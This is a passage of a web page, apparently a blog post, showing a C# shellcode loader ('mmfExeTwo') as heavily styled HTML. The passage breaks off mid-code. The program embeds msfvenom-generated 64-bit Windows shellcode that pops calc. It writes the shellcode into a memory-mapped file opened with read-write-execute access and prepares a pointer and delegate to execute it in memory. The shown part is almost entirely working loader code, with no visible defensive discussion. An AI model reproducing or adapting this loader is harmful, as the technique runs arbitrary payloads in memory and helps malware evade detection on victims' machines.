code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">namespace</span> mmfExeTwo</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">{</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   <span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   <span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.IO.<span style="color: rgb(0, 134, 179);">MemoryMappedFiles</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   <span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Runtime</span>.<span style="color: rgb(0, 134, 179);">InteropServices</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   <span style="color: rgb(167, 29, 93);">class</span> <span style="color: rgb(0, 134, 179);">Program</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">   {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">delegate</span> <span style="color: rgb(0, 134, 179);">IntPtr</span> <span style="color: rgb(0, 134, 179);">NewDelegate</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(150, 152, 150);">// To handle the location by applying the appropriate type</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(150, 152, 150);">// We had to create a delegate to handle the the pointer to the location where we shim in the shellcode</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(150, 152, 150);">// into the Memory Mapped File.  This allows the location of the opp code to be referenced later for execution</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">unsafe</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(0, 134, 179);">IntPtr</span> <span style="color: rgb(0, 134, 179);">GetShellMemAddr</span>()</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">       {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(150, 152, 150);">// 64bit shell code.  Tested on a win10 system.  Injects "cmd -k calc"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(150, 152, 150);">// was generated vanilla using "msfvenom -p windows/exec CMD="cmd /k calc" EXITFUNC=thread C -f powershell"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(167, 29, 93);">var</span> shellcode = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(167, 29, 93);">byte</span>[]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0xfc</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x83</span>,<span style="color: rgb(0, 134, 179);">0xe4</span>,<span style="color: rgb(0, 134, 179);">0xf0</span>,<span style="color: rgb(0, 134, 179);">0xe8</span>,<span style="color: rgb(0, 134, 179);">0xc0</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x50</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x56</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xd2</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x60</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x18</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x72</span>,<span style="color: rgb(0, 134, 179);">0x50</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x0f</span>,<span style="color: rgb(0, 134, 179);">0xb7</span>,<span style="color: rgb(0, 134, 179);">0x4a</span>,<span style="color: rgb(0, 134, 179);">0x4a</span>,<span style="color: rgb(0, 134, 179);">0x4d</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xc0</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0xac</span>,<span style="color: rgb(0, 134, 179);">0x3c</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x7c</span>,<span style="color: rgb(0, 134, 179);">0x02</span>,<span style="color: rgb(0, 134, 179);">0x2c</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0xc1</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0x0d</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xc1</span>,<span style="color: rgb(0, 134, 179);">0xe2</span>,<span style="color: rgb(0, 134, 179);">0xed</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x51</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x42</span>,<span style="color: rgb(0, 134, 179);">0x3c</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x80</span>,<span style="color: rgb(0, 134, 179);">0x88</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x85</span>,<span style="color: rgb(0, 134, 179);">0xc0</span>,<span style="color: rgb(0, 134, 179);">0x74</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x50</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x18</span>,<span style="color: rgb(0, 134, 179);">0x44</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x40</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x49</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0xe3</span>,<span style="color: rgb(0, 134, 179);">0x56</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x34</span>,<span style="color: rgb(0, 134, 179);">0x88</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd6</span>,<span style="color: rgb(0, 134, 179);">0x4d</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0xc0</span>,<span style="color: rgb(0, 134, 179);">0xac</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0xc1</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0x0d</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xc1</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x38</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x75</span>,<span style="color: rgb(0, 134, 179);">0xf1</span>,<span style="color: rgb(0, 134, 179);">0x4c</span>,<span style="color: rgb(0, 134, 179);">0x03</span>,<span style="color: rgb(0, 134, 179);">0x4c</span>,<span style="color: rgb(0, 134, 179);">0x24</span>,<span style="color: rgb(0, 134, 179);">0x08</span>,<span style="color: rgb(0, 134, 179);">0x45</span>,<span style="color: rgb(0, 134, 179);">0x39</span>,<span style="color: rgb(0, 134, 179);">0xd1</span>,<span style="color: rgb(0, 134, 179);">0x75</span>,<span style="color: rgb(0, 134, 179);">0xd8</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x44</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x40</span>,<span style="color: rgb(0, 134, 179);">0x24</span>,<span style="color: rgb(0, 134, 179);">0x49</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x66</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x0c</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x44</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x40</span>,<span style="color: rgb(0, 134, 179);">0x1c</span>,<span style="color: rgb(0, 134, 179);">0x49</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x04</span>,<span style="color: rgb(0, 134, 179);">0x88</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x5e</span>,<span style="color: rgb(0, 134, 179);">0x59</span>,<span style="color: rgb(0, 134, 179);">0x5a</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x59</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x5a</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x83</span>,<span style="color: rgb(0, 134, 179);">0xec</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x58</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x59</span>,<span style="color: rgb(0, 134, 179);">0x5a</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,<span style="color: rgb(0, 134, 179);">0x12</span>,<span style="color: rgb(0, 134, 179);">0xe9</span>,<span style="color: rgb(0, 134, 179);">0x57</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0x5d</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x31</span>,<span style="color: rgb(0, 134, 179);">0x8b</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0x87</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xd5</span>,<span style="color: rgb(0, 134, 179);">0xbb</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x1d</span>,<span style="color: rgb(0, 134, 179);">0x2a</span>,<span style="color: rgb(0, 134, 179);">0x0a</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0xa6</span>,<span style="color: rgb(0, 134, 179);">0x95</span>,<span style="color: rgb(0, 134, 179);">0xbd</span>,<span style="color: rgb(0, 134, 179);">0x9d</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0xd5</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x83</span>,<span style="color: rgb(0, 134, 179);">0xc4</span>,<span style="color: rgb(0, 134, 179);">0x28</span>,<span style="color: rgb(0, 134, 179);">0x3c</span>,<span style="color: rgb(0, 134, 179);">0x06</span>,<span style="color: rgb(0, 134, 179);">0x7c</span>,<span style="color: rgb(0, 134, 179);">0x0a</span>,<span style="color: rgb(0, 134, 179);">0x80</span>,<span style="color: rgb(0, 134, 179);">0xfb</span>,<span style="color: rgb(0, 134, 179);">0xe0</span>,<span style="color: rgb(0, 134, 179);">0x75</span>,<span style="color: rgb(0, 134, 179);">0x05</span>,<span style="color: rgb(0, 134, 179);">0xbb</span>,<span style="color: rgb(0, 134, 179);">0x47</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(0, 134, 179);">0x13</span>,<span style="color: rgb(0, 134, 179);">0x72</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0x6a</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x59</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x89</span>,<span style="color: rgb(0, 134, 179);">0xda</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xd5</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x6c</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x00</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               };</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(0, 134, 179);">MemoryMappedFile</span> mmf = <span style="color: rgb(167, 29, 93);">null</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(0, 134, 179);">MemoryMappedViewAccessor</span> viewaccessor = <span style="color: rgb(167, 29, 93);">null</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           <span style="color: rgb(167, 29, 93);">try</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">           {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(150, 152, 150);">/* The try block creates the MMF and assigns the RWE permissions</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(0, 134, 179);">The</span> view accessor <span style="color: rgb(167, 29, 93);">is</span> created <span style="color: rgb(167, 29, 93);">with</span> matching permissions</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               the shell code <span style="color: rgb(167, 29, 93);">from</span> <span style="color: rgb(0, 134, 179);">GetShellMemAddr</span> <span style="color: rgb(167, 29, 93);">is</span> written to MMF</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(167, 29, 93);">then</span> the pointer <span style="color: rgb(167, 29, 93);">is</span> gained <span style="color: rgb(167, 29, 93);">and</span> a <span style="color: rgb(167, 29, 93);">delegate</span> <span style="color: rgb(167, 29, 93);">is</span> created to handle pointer value</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               so that it can be passed <span style="color: rgb(167, 29, 93);">in</span> therms of the returned <span style="color: rgb(167, 29, 93);">function</span> */</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               mmf = <span style="color: rgb(0, 134, 179);">MemoryMappedFile</span>.<span style="color: rgb(0, 134, 179);">CreateNew</span>(<span style="color: rgb(24, 54, 145);">"__shellcode"</span>, shellcode.<span style="color: rgb(0, 134, 179);">Length</span>, <span style="color: rgb(0, 134, 179);">MemoryMappedFileAccess</span>.<span style="color: rgb(0, 134, 179);">ReadWriteExecute</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               viewaccessor = mmf.<span style="color: rgb(0, 134, 179);">CreateViewAccessor</span>(<span style="color: rgb(0, 134, 179);">0</span>, shellcode.<span style="color: rgb(0, 134, 179);">Length</span>, <span style="color: rgb(0, 134, 179);">MemoryMappedFileAccess</span>.<span style="color: rgb(0, 134, 179);">ReadWriteExecute</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               viewaccessor.<span style="color: rgb(0, 134, 179);">WriteArray</span>(<span style="color: rgb(0, 134, 179);">0</span>, shellcode, <span style="color: rgb(0, 134, 179);">0</span>, shellcode.<span style="color: rgb(0, 134, 179);">Length</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">               <span style="color: rgb(167, 29, 93);">var</span> pointer = (<span style="color: rgb(167, 29, 93);">byte</span>*)<span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial 